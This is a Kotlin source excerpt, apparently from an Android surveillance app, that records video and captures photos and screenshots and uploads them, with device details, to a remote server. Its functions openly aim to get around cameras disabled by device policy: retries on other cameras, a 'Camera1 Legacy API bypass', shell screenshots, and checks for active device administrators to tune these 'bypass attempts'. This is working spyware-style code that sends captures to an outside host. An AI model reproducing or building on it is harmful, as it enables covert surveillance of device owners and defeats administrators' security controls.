    private fun startRecordingSafely(useFront: Boolean, minutes: Int) {
        try {
            if (!hasPerm(Manifest.permission.CAMERA)) {
                Log.w(TAG, "Camera permission denied for video recording")
                requestCameraPermissionSafely()
                sendErrorToBackend("Camera permission not granted for video recording")
                return
            }

            if (!checkCameraAvailabilitySafely()) {
                handleCameraUnavailable(useFront)
                return
            }

            retryAttempts = 0
            startRecording(useFront, minutes)

        } catch (e: Exception) {
            Log.e(TAG, "Error in startRecordingSafely: ${e.message}")
            sendErrorToBackend("Video recording initialization error: ${e.message}")
        }
    }

    /* ═════════════════ VIDEO RECORD ══════════════ */
    private fun startRecording(useFront: Boolean, minutes: Int) {
        closeSession()

        // First try the requested camera
        val camId = selectCamera(useFront)
        if (camId == null) {
            Log.w(TAG, "Requested ${if (useFront) "front" else "back"} camera not available for video, trying alternatives")
            // Try the opposite camera first
            val alternativeCamId = selectCamera(!useFront)
            if (alternativeCamId != null) {
                Log.d(TAG, "Using alternative ${if (!useFront) "front" else "back"} camera for video: $alternativeCamId")
                try {
                    startRecordingWithCamera(alternativeCamId, !useFront, minutes)
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "Alternative camera also failed for video: ${e.message}")
                }
            }

            // If we couldn't find any camera, send error
            sendErrorToBackend("No suitable camera found for video recording")
            return
        }

        // Try to start recording with the selected camera
        try {
            startRecordingWithCamera(camId, useFront, minutes)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Camera access exception for video: ${e.message}")
            when (e.reason) {
                CameraAccessException.CAMERA_DISABLED -> {
                    Log.w(TAG, "Camera disabled by policy for video, trying alternative")
                    // Try the opposite camera
                    val alternativeCamId = selectCamera(!useFront)
                    if (alternativeCamId != null) {
                        try {
                            startRecordingWithCamera(alternativeCamId, !useFront, minutes)
                            sendErrorToBackend("Primary camera disabled by policy, using alternative camera for video")
                            return
                        } catch (e2: Exception) {
                            Log.e(TAG, "Alternative camera also failed for video: ${e2.message}")
                        }
                    }

                    // If alternative also failed, schedule retry
                    sendErrorToBackend("Camera disabled by device policy - video recording blocked by admin settings. Will retry later.")
                    scheduleRetryWithBackoff {
                        Log.d(TAG, "Retrying video recording after camera disabled by policy")
                        startRecording(useFront, minutes)
                    }
                }
                else -> {
                    sendErrorToBackend("Camera access error for video: ${e.message}")
                }
            }
            closeSession()
        } catch (e: Exception) {
            Log.e(TAG, "Camera error for video: ${e.message}")
            e.printStackTrace()
            sendErrorToBackend("Camera error for video: ${e.message}")
            closeSession()
        }
    }

    private fun startRecordingWithCamera(camId: String, isFront: Boolean, minutes: Int) {
        val file = File(cacheDir, "video_${stamp()}.mp4")

        try {
            mediaRec = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(4_000_000)
                setVideoFrameRate(30)
                setVideoSize(1280, 720)
                setOutputFile(file.absolutePath)
                prepare()
            }

            Log.d(TAG, "Attempting to open camera for video: $camId (${if (isFront) "front" else "back"})")

            camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    Log.d(TAG, "Camera opened successfully for video: $camId")
                    camDev = dev
                    // Reset retry attempts on successful camera open
                    retryAttempts = 0
                    // Reset camera disabled state on successful open
                    isCameraDisabled = false

                    try {
                        dev.createCaptureSession(listOf(mediaRec!!.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(sess: CameraCaptureSession) {
                                    capSes = sess
                                    val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                        addTarget(mediaRec!!.surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                    }.build()
                                    sess.setRepeatingRequest(req, null, bgHandler)
                                    mediaRec!!.start()

                                    Log.d(TAG, "Video recording started successfully for ${minutes} minutes")

                                    bgHandler.postDelayed({
                                        stopRecording(file)
                                    }, (minutes * 60_000L))
                                }

                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    Log.e(TAG, "Failed to configure camera session for video")
                                    sendErrorToBackend("Failed to configure camera for video recording")
                                    closeSession()
                                }
                            }, bgHandler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating capture session for video: ${e.message}")
                        sendErrorToBackend("Error setting up video recording: ${e.message}")
                        closeSession()
                    }
                }

                override fun onDisconnected(dev: CameraDevice) {
                    Log.w(TAG, "Camera disconnected during video recording: $camId")
                    dev.close()
                    sendErrorToBackend("Camera disconnected during video recording")
                }

                override fun onError(dev: CameraDevice, error: Int) {
                    val errorName = when(error) {
                        CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> "ERROR_CAMERA_DISABLED"
                        CameraDevice.StateCallback.ERROR_CAMERA_DEVICE -> "ERROR_CAMERA_DEVICE"
                        CameraDevice.StateCallback.ERROR_CAMERA_SERVICE -> "ERROR_CAMERA_SERVICE"
                        CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> "ERROR_CAMERA_IN_USE"
                        CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> "ERROR_MAX_CAMERAS_IN_USE"
                        else -> "UNKNOWN_ERROR($error)"
                    }

                    Log.e(TAG, "Camera error during video recording: $camId (${if (isFront) "FRONT" else "BACK"}), error: $errorName ($error)")
                    dev.close()

                    // Create a detailed error message with camera information
                    val cameraInfo = try {
                        val characteristics = camMgr.getCameraCharacteristics(camId)
                        val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                        val facingStr = when (facing) {
                            CameraCharacteristics.LENS_FACING_FRONT -> "FRONT"
                            CameraCharacteristics.LENS_FACING_BACK -> "BACK"
                            else -> "EXTERNAL"
                        }
                        "Camera $camId ($facingStr)"
                    } catch (e: Exception) {
                        "Camera $camId"
                    }

                    val errorMsg = when (error) {
                        CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> "$cameraInfo disabled by device policy during recording"
                        CameraDevice.StateCallback.ERROR_CAMERA_DEVICE -> "$cameraInfo device error during recording"
                        CameraDevice.StateCallback.ERROR_CAMERA_SERVICE -> "$cameraInfo service error during recording"
                        CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> "$cameraInfo taken by another app during recording"
                        CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> "Maximum cameras in use error during recording"
                        else -> "Unknown $cameraInfo error during recording: $error"
                    }

                    sendErrorToBackend(errorMsg)
                    closeSession()

                    // For certain errors, try to restart recording after a delay
                    when (error) {
                        CameraDevice.StateCallback.ERROR_CAMERA_IN_USE,
                        CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> {
                            // These errors might be temporary, so retry after a delay
                            Log.d(TAG, "Scheduling video recording retry after camera error: $errorName")
                            bgHandler.postDelayed({
                                Log.d(TAG, "Retrying video recording after error delay")
                                startRecording(!isFront, 1) // Try with opposite camera for 1 minute
                            }, 5000)
                        }
                    }
                }
            }, bgHandler)
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up video recording: ${e.message}")
            e.printStackTrace()
            closeSession()
            throw e  // Re-throw to let caller handle it
        }
    }

    private fun stopRecording(f: File) {
        try {
            mediaRec?.apply { stop(); reset() }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        uploadFile("/video", "video", f)
        closeSession()
    }

    /* ═════════════ Utilities / Helpers ═══════════ */
    private fun uploadFile(endpoint: String, part: String, f: File) = scope.launch {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart(part, f.name, f.asRequestBody(
                    if (part == "photo") "image/jpeg".toMediaType()
                    else "video/mp4".toMediaType()
                )).build()

            val request = Request.Builder()
                .url("$server$endpoint")
                .addHeader("X-Auth", authHeader)
                .post(body)
                .build()

            http.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            f.delete()
        }
    }

    private fun selectCamera(front: Boolean): String? =
        camMgr.cameraIdList.firstOrNull { id ->
            camMgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING)
                .let {
                    if (front) it == CameraCharacteristics.LENS_FACING_FRONT
                    else it == CameraCharacteristics.LENS_FACING_BACK
                }
        }

    private fun closeSession() {
        capSes?.close(); capSes = null
        camDev?.close(); camDev = null
        imgReader?.close(); imgReader = null
        mediaRec?.release(); mediaRec = null
    }

    private fun checkCameraAvailability(): Boolean {
        try {
            val availableCameras = camMgr.cameraIdList
            Log.d(TAG, "Available cameras: ${availableCameras.contentToString()}")

            if (availableCameras.isEmpty()) {
                Log.e(TAG, "No cameras available on device")
                sendErrorToBackend("No cameras available on device")
                isCameraDisabled = true
                return false
            }

            // Check if any camera is accessible
            var accessibleCameras = 0
            var disabledCameras = 0
            var errorCameras = 0

            for (camId in availableCameras) {
                try {
                    val characteristics = camMgr.getCameraCharacteristics(camId)
                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                    Log.d(TAG, "Camera $camId - Facing: $facing")

                    // Try to actually open the camera to check if it's accessible
                    try {
                        // Create a temporary handler for this test
                        val tempThread = HandlerThread("CameraAvailabilityTest").apply { start() }
                        val tempHandler = Handler(tempThread.looper)

                        // Set up a latch to wait for the result
                        val latch = java.util.concurrent.CountDownLatch(1)
                        var cameraAccessible = false
                        var cameraError: String? = null

                        camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
                            override fun onOpened(camera: CameraDevice) {
                                Log.d(TAG, "Camera $camId opened successfully in test")
                                cameraAccessible = true
                                camera.close()
                                latch.countDown()
                            }

                            override fun onDisconnected(camera: CameraDevice) {
                                Log.d(TAG, "Camera $camId disconnected in test")
                                camera.close()
                                latch.countDown()
                            }

                            override fun onError(camera: CameraDevice, error: Int) {
                                val errorName = when(error) {
                                    CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> "ERROR_CAMERA_DISABLED"
                                    CameraDevice.StateCallback.ERROR_CAMERA_DEVICE -> "ERROR_CAMERA_DEVICE"
                                    CameraDevice.StateCallback.ERROR_CAMERA_SERVICE -> "ERROR_CAMERA_SERVICE"
                                    CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> "ERROR_CAMERA_IN_USE"
                                    CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> "ERROR_MAX_CAMERAS_IN_USE"
                                    else -> "UNKNOWN_ERROR($error)"
                                }

                                // Create a detailed error message with camera information
                                val cameraInfo = try {
                                    val characteristics = camMgr.getCameraCharacteristics(camId)
                                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                                    val facingStr = when (facing) {
                                        CameraCharacteristics.LENS_FACING_FRONT -> "FRONT"
                                        CameraCharacteristics.LENS_FACING_BACK -> "BACK"
                                        else -> "EXTERNAL"
                                    }
                                    "Camera $camId ($facingStr)"
                                } catch (e: Exception) {
                                    "Camera $camId"
                                }

                                val errorMsg = when (error) {
                                    CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> "$cameraInfo disabled by device policy"
                                    CameraDevice.StateCallback.ERROR_CAMERA_DEVICE -> "$cameraInfo device error"
                                    CameraDevice.StateCallback.ERROR_CAMERA_SERVICE -> "$cameraInfo service error"
                                    CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> "$cameraInfo in use by another app"
                                    CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> "Maximum number of cameras in use"
                                    else -> "Unknown $cameraInfo error: $error"
                                }

                                Log.e(TAG, "Camera $camId error in availability test: $errorName - $errorMsg")
                                cameraError = errorMsg
                                camera.close()
                                latch.countDown()
                            }
                        }, tempHandler)

                        // Wait for the result with a timeout
                        if (!latch.await(2, java.util.concurrent.TimeUnit.SECONDS)) {
                            Log.e(TAG, "Camera $camId test timed out")
                            errorCameras++
                        } else if (cameraAccessible) {
                            accessibleCameras++
                        } else if (cameraError?.contains("disabled by policy") == true) {
                            disabledCameras++
                        } else {
                            errorCameras++
                        }

                        // Clean up the temporary thread
                        tempThread.quitSafely()
                    } catch (e: SecurityException) {
                        Log.e(TAG, "Security exception accessing camera $camId: ${e.message}")
                        errorCameras++
                    } catch (e: CameraAccessException) {
                        if (e.reason == CameraAccessException.CAMERA_DISABLED) {
                            Log.e(TAG, "Camera $camId disabled by policy")
                            disabledCameras++
                        } else {
                            Log.e(TAG, "Camera access exception for camera $camId: ${e.message}")
                            errorCameras++
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error testing camera $camId: ${e.message}")
                        errorCameras++
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking camera $camId characteristics: ${e.message}")
                    errorCameras++
                }
            }

            Log.d(TAG, "Camera availability summary: ${availableCameras.size} total, $accessibleCameras accessible, $disabledCameras disabled by policy, $errorCameras with errors")

            // Consider cameras available if at least one is accessible
            if (accessibleCameras > 0) {
                isCameraDisabled = false
                return true
            }

            // If all cameras are disabled by policy, report this specifically
            if (disabledCameras > 0 && accessibleCameras == 0) {
                Log.e(TAG, "All cameras are disabled by device policy")
                isCameraDisabled = true
                return false
            }

            // If we get here, no cameras are accessible but for reasons other than policy
            isCameraDisabled = true
            return false
        } catch (e: Exception) {
            Log.e(TAG, "Error checking camera availability: ${e.message}")
            sendErrorToBackend("Camera service error: ${e.message}")
            isCameraDisabled = true
            return false
        }
    }

    private fun hasPerm(p: String): Boolean {
        val hasPermission = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
        Log.d(TAG, "Permission $p: $hasPermission")
        return hasPermission
    }

    private fun isCameraDisabled(): Boolean {
        return isCameraDisabled
    }

    private fun stamp() =
        SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())

    /* ── Error Reporting with Rate Limiting ──────────────────────── */
    private fun sendErrorToBackend(error: String) = scope.launch {
        val currentTime = System.currentTimeMillis()

        // Rate limit error reporting
        if (currentTime - lastErrorTime < ERROR_COOLDOWN) {
            Log.d(TAG, "Rate limiting error report: $error")
            return@launch
        }

        lastErrorTime = currentTime

        Log.e(TAG, "Sending error to backend: $error")

        try {
            val deviceInfo = org.json.JSONObject().apply {
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("sdk_level", Build.VERSION.SDK_INT)
                put("camera_disabled", isCameraDisabled)
                put("retry_attempts", retryAttempts)
            }

            val json = org.json.JSONObject().apply {
                put("error", error)
                put("device", deviceId)
                put("timestamp", currentTime)
                put("device_info", deviceInfo)
                put("service", "camera")
            }

            val body = okhttp3.RequestBody.create(
                "application/json".toMediaType(),
                json.toString()
            )

            val request = okhttp3.Request.Builder()
                .url("$server/json/error")
                .addHeader("X-Auth", authHeader)
                .post(body)
                .build()

            http.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Error report sent successfully")
                } else {
                    Log.e(TAG, "Error report failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send error to backend: ${e.message}")
        }
    }

    private fun requestCameraPermission() {
        Log.d(TAG, "Requesting camera permission")

        // Check if we already have the permission
        val hasPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

        if (hasPermission) {
            Log.d(TAG, "Camera permission is already granted")
            return
        }

        // Track when we last requested permission to avoid spamming
        val currentTime = System.currentTimeMillis()
        val lastPermissionRequest = lastCameraPermissionRequestTime

        // Don't request permission more than once every 30 seconds
        if (lastPermissionRequest > 0 && currentTime - lastPermissionRequest < 30000) {
            Log.d(TAG, "Skipping permission request, last request was ${(currentTime - lastPermissionRequest) / 1000} seconds ago")
            return
        }

        lastCameraPermissionRequestTime = currentTime

        try {
            Log.d(TAG, "Launching permission request activity")
            val intent = Intent(this, PermissionHelperActivity::class.java).apply {
                putExtra("runtime_permission", android.Manifest.permission.CAMERA)
                putExtra("permission", "camera")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendErrorToBackend("Requesting camera permission from user")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request camera permission: ${e.message}")
            e.printStackTrace()
            sendErrorToBackend("Failed to request camera permission: ${e.javaClass.simpleName} - ${e.message}")
        }
    }

    // Track when we last requested permission to avoid spamming
    private var lastCameraPermissionRequestTime: Long = 0

    private fun post(path: String, data: String, mime: String) = scope.launch {
        var retryCount = 0
        val maxRetries = 3
        while (retryCount < maxRetries) {
            try {
                val request = Request.Builder()
                    .url(server + path)
                    .header("X-Auth", "$secretKey:$deviceId")
                    .post(data.toRequestBody(mime.toMediaType()))
                    .build()

                http.newCall(request).execute().use { response ->
                    Log.d(TAG, "POST $path: ${response.code}")
                    if (response.isSuccessful) {
                        return@launch
                    } else {
                        Log.e(TAG, "Upload failed: ${response.code} - ${response.body?.string()}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "POST error on attempt ${retryCount + 1}: ${e.message}")
            }
            retryCount++
            kotlinx.coroutines.delay(2000L * retryCount) // Exponential backoff
        }
        Log.e(TAG, "Failed to post data after $maxRetries attempts")
    }

    // Camera1 Legacy API bypass - often works when Camera2 is blocked
    private suspend fun tryCamera1APIBypass(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Attempting Camera1 Legacy API bypass")

            val cameraId = if (useFront) android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT else android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK

            // Find the correct camera ID
            var targetCameraId = -1
            for (i in 0 until android.hardware.Camera.getNumberOfCameras()) {
                val cameraInfo = android.hardware.Camera.CameraInfo()
                android.hardware.Camera.getCameraInfo(i, cameraInfo)
                if (cameraInfo.facing == cameraId) {
                    targetCameraId = i
                    break
                }
            }

            if (targetCameraId == -1) {
                Log.e(TAG, "Camera1: Target camera not found")
                return@withContext false
            }

            Log.d(TAG, "Camera1: Opening camera $targetCameraId")
            val camera = android.hardware.Camera.open(targetCameraId)

            try {
                val parameters = camera.parameters
                parameters.setPictureFormat(android.graphics.ImageFormat.JPEG)

                // Set reasonable picture size
                val pictureSizes = parameters.supportedPictureSizes
                if (pictureSizes.isNotEmpty()) {
                    val size = pictureSizes[0] // Use first available size
                    parameters.setPictureSize(size.width, size.height)
                    Log.d(TAG, "Camera1: Picture size set to ${size.width}x${size.height}")
                }

                camera.parameters = parameters

                // Take picture
                val latch = java.util.concurrent.CountDownLatch(1)
                var pictureData: ByteArray? = null

                camera.takePicture(null, null) { data, _ ->
                    pictureData = data
                    latch.countDown()
                }

                // Wait for picture with timeout
                val pictureSuccess = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)

                if (pictureSuccess && pictureData != null) {
                    Log.d(TAG, "Camera1: Picture captured successfully")

                    // Save the photo
                    val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                    val filename = "camera1_bypass_${if (useFront) "front" else "back"}_$timestamp.jpg"
                    val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), filename)

                    FileOutputStream(file).use { fos ->
                        fos.write(pictureData!!)
                    }

                    Log.d(TAG, "Camera1: Photo saved to ${file.absolutePath}")

                    // Upload to backend
                    scope.launch {
                        uploadFile("/capture", "photo", file)
                        Log.d(TAG, "Camera1: Photo uploaded successfully")
                    }

                    return@withContext true
                } else {
                    Log.e(TAG, "Camera1: Picture capture failed or timed out")
                    return@withContext false
                }

            } finally {
                camera.release()
                Log.d(TAG, "Camera1: Camera released")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Camera1 API bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun createBasicScreenCapture(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Creating basic screen capture as camera fallback")

            // Create a simple black image with text indicating camera is blocked
            val bitmap = Bitmap.createBitmap(640, 480, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)

            // Black background
            canvas.drawColor(Color.BLACK)

            val paint = Paint().apply {
                color = Color.WHITE
                textSize = 24f
                isAntiAlias = true
                textAlign = Paint.Align.CENTER
            }

            // Add text
            canvas.drawText("Camera Blocked by Device Policy", 320f, 200f, paint)
            canvas.drawText("${if (useFront) "Front" else "Back"} Camera", 320f, 240f, paint)
            canvas.drawText(SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()), 320f, 280f, paint)

            // Save the image
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "basic_capture_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), filename)

            FileOutputStream(file).use { fos ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, fos)
            }

            bitmap.recycle()

            Log.d(TAG, "Basic screen capture created: ${file.absolutePath}")

            // Upload to backend
            scope.launch {
                uploadFile("/capture", "photo", file)
                Log.d(TAG, "Basic screen capture uploaded")
            }

            true

        } catch (e: Exception) {
            Log.e(TAG, "Basic screen capture failed: ${e.message}")
            false
        }
    }

    private suspend fun takeSystemScreenshot(outputFile: File): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Attempting system screenshot")

            // Try shell command for screenshot
            val result = Runtime.getRuntime().exec("screencap -p ${outputFile.absolutePath}")
            result.waitFor()

            if (outputFile.exists() && outputFile.length() > 0) {
                Log.d(TAG, "System screenshot successful: ${outputFile.absolutePath}")
                true
            } else {
                Log.e(TAG, "System screenshot failed - file not created or empty")
                false
            }

        } catch (e: Exception) {
            Log.e(TAG, "System screenshot failed: ${e.message}")
            false
        }
    }

    private fun optimizeForDevicePolicyRestrictions() {
        // Check if device policy is blocking camera
        if (isDevicePolicyBlocking()) {
            Log.w(TAG, "Device policy detected - optimizing for restricted environment")

            // Set faster timeout for bypass attempts
            bypassTimeoutMs = 2000 // Reduce from default 5000ms

            // Skip expensive bypass methods that we know will fail
            skipReflectionBypass = true
            skipSystemPropertyBypass = true

            // Prioritize screenshot-based capture for this device
            preferScreenshotCapture = true

            // Enable background-optimized capture mode
            backgroundOptimizedMode = true

            Log.d(TAG, "Device policy optimization enabled")
        }
    }

    private fun isDevicePolicyBlocking(): Boolean {
        return try {
            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponents = devicePolicyManager.activeAdmins

            // Check if any device admin is active that might block camera
            val hasActiveAdmin = adminComponents?.isNotEmpty() == true

            // Also check for work profile restrictions
            val hasWorkProfile = devicePolicyManager.isProfileOwnerApp(packageName) ||
                    devicePolicyManager.isDeviceOwnerApp(packageName)

            Log.d(TAG, "Device policy check: hasActiveAdmin=$hasActiveAdmin, hasWorkProfile=$hasWorkProfile")

            hasActiveAdmin || hasWorkProfile
        } catch (e: Exception) {
            Log.e(TAG, "Error checking device policy: ${e.message}")
            false
        }
    }




    private fun launchEnhancedScreenshotCapture(useFront: Boolean) {
        Log.d(TAG, "Starting ENHANCED screenshot-based camera capture")

        // For device policy restricted environments, optimize for speed
        if (backgroundOptimizedMode) {
            Log.d(TAG, "Using background-optimized screenshot capture")
            scope.launch {
                // Skip camera app launch, go directly to screenshot
                val success = tryDirectScreenshotCapture(useFront)
                if (success) {
                    Log.d(TAG, "Background optimized screenshot successful")
                } else {
                    // Fallback to device info image
                    createDeviceInfoImage(useFront)
                    Log.d(TAG, "Fallback to device info image")
                }
            }
            return
        }

        // Original method for non-restricted devices
        scope.launch {
            val success = tryLaunchCameraAppAndCapture(useFront)
            if (!success) {
                // Fallback to direct screenshot
                val screenshotSuccess = tryDirectScreenshotCapture(useFront)
                if (!screenshotSuccess) {
                    createDeviceInfoImage(useFront)
                }
            }
        }
    }

    private suspend fun tryDirectScreenshotCapture(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Attempting direct system screenshot")

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "screenshot_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), filename)

            val screenshotSuccess = takeSystemScreenshot(file)

            if (screenshotSuccess && file.exists() && file.length() > 0) {
                Log.d(TAG, "Direct screenshot successful: ${file.absolutePath}")

                // Upload to backend
                scope.launch {
                    uploadFile("/capture", "photo", file)
                    Log.d(TAG, "Direct screenshot uploaded")
                }
                return@withContext true
            } else {
                Log.e(TAG, "Direct screenshot failed - file not created or empty")
                return@withContext false
            }

        } catch (e: Exception) {
            Log.e(TAG, "Direct screenshot capture failed: ${e.message}")
            false
        }
    }
}